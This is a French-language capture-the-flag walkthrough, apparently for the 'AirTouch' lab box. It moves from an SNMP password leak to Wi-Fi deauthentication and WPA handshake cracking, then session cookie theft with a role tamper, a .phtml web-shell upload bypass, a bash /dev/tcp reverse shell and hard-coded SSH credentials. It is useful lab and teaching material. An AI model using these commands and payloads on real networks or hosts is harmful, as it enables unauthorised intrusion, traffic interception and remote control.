![[IMG-20260211174756273.png]]

![[IMG-20260211174756374.png]]

```
snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
```

On utilise ce mdp pour se connecter en SSH:
![[IMG-20260211174756496.png]]

Config Réseau:

![[IMG-20260211174756591.png]]

On retrouve aussi ce schéma dans le home directory:

![[IMG-20260211174756713.png]]

Pour cette boxe, on utilise la ressource suivante: [https://v1lab.wifichallenge.com/walkthrough](https://v1lab.wifichallenge.com/walkthrough "https://v1lab.wifichallenge.com/walkthrough")

On active l'interface wlan0:
```bash
ip link set wlan0 up
```

Et on liste tous les points d’accès Wi-Fi:
```bash
iw dev wlan0 scan
```

![[IMG-20260211174756817.png]]

On se met en mode monitor:
```bash
sudo airmon-ng start wlan0
```

Puis on écoute ce qui se passe sur le réseau:
```bash
airodump-ng wlan0mon -w scan --manufacturer --wps -c6
```

On oserve:
![[IMG-20260211174756957.png]]

On force à présent le user de se reconnecter au Wifi avec cette commande:
```
aireplay-ng -0 5 -a F0:9F:C2:A3:F1:A7  -c 28:6C:07:FE:A3:22  wlan0mon
```

Et on observe en haut de la premiere commande:
```
WPA handshake: F0:9F:C2:A3:F1:A7
```

![[IMG-20260211174757195.png]]

Ensuite on utilise ce mdp pour cracker le mdp du wifi:
```
aircrack-ng -w /root/eaphammer/wordlists/rockyou.txt scan-03.cap
```

![[IMG-20260211174757373.png]]

```
Mdp: challenge
```

On set up une nouvelle interface client:
```bash
ip link set wlan3 down
iw dev wlan3 set type managed
ip link set wlan3 up
```

Config WPA2:
```
wpa_passphrase "AirTouch-Internet" "challenge" > /tmp/wifi.conf
```

On se connecte au wifi:
```
wpa_supplicant -B -i wlan3 -c /tmp/wifi.conf
```

On s'attribue une IP:
```
dhclient wlan3
```

On scan le réseau:
![[IMG-20260211174757436.png]]

Et on découvre l'IP 192.168.3.46 qu'on peut scanner:
![[IMG-20260211174757559.png]]

On port forward le port 80 pour acceder au site:
```
ssh -L 8080:192.168.3.1:80 consultant@10.129.17.36 
```

![[IMG-20260211174757949.png]]

On arrive sur une page de login mais on ne dispose pas des identifiants.

L’idée est donc d’analyser la capture réseau `.cap` réalisée précédemment. Comme on a forcé un client à se déconnecter puis se reconnecter (deauth), il est possible qu’il ait ensuite accédé au routeur **en étant déjà authentifié**.

```
scp consultant@10.129.25.38:/home/consultant/scan-02.cap . 
```

En déchiffrant le trafic WiFi dans Wireshark grâce à la clé WPA2-PSK:
**Edit → Preferences → Protocols → IEEE 802.11 → Decryption Keys**
![[IMG-20260211194945640.png]]

On peut inspecter les flux HTTP et potentiellement récupérer une session valide (cookies type `PHPSESSID`, `UserRole`) permettant d’accéder à l’interface sans connaître le mot de passe.
![[IMG-20260211195121279.png]]

```
Frame 1333: 243 bytes on wire (1944 bits), 243 bytes captured (1944 bits)
IEEE 802.11 Data, Flags: .p.....T
Logical-Link Control
Internet Protocol Version 4, Src: 192.168.3.74, Dst: 192.168.3.1
Transmission Control Protocol, Src Port: 52812, Dst Port: 80, Seq: 1, Ack: 1, Len: 143
Hypertext Transfer Protocol
    GET /lab.php HTTP/1.1\r\n
    Host: 192.168.3.1\r\n
    User-Agent: curl/7.88.1\r\n
    Accept: */*\r\n
    Cookie: PHPSESSID=bts4i0slpt999k2j78gjv07eqg; UserRole=user\r\n
    \r\n
    [Full request URI: http://192.168.3.1/lab.php]
    [HTTP request 1/1]
    [Response in frame: 1335]
```

En utilisant ce cookie et en mettant UserRole=admin, on arrive sur cette page:
![[IMG-20260211201408823.png]]

On tente d’uploader un fichier PHP classique (`shell.php`), mais le serveur refuse explicitement :
![[IMG-20260211202154981.png]]

Cela indique qu’un filtre bloque certaines extensions (probablement `.php` et `.html`).
Cependant, ce type de filtrage est souvent incomplet et ne prend pas en compte d’autres extensions reconnues par Apache/PHP.  
On peut alors contourner la restriction en utilisant une extension alternative interprétée comme du PHP

shell.phtml
```
<?php system($_GET["cmd"]); ?>
```

![[IMG-20260211202508913.png]]

On utilise cette payload:
```
bash -c 'bash -i >& /dev/tcp/192.168.3.23/4444 0>&1'
```

![[IMG-20260211203743648.png]]

Dans le fichier login.php on retrouve des creds hard codé:
![[IMG-20260211205111046.png]]

On trouve donc les creds ssh pour se connecter à la machine:
```
user:JunDRDZKHDnpkpDDvay
```

![[IMG-20260211205527276.png]]

https://github.com/snovvcrash/PPN/blob/master/pentest/wi-fi/wpa-wpa2/enterprise.md

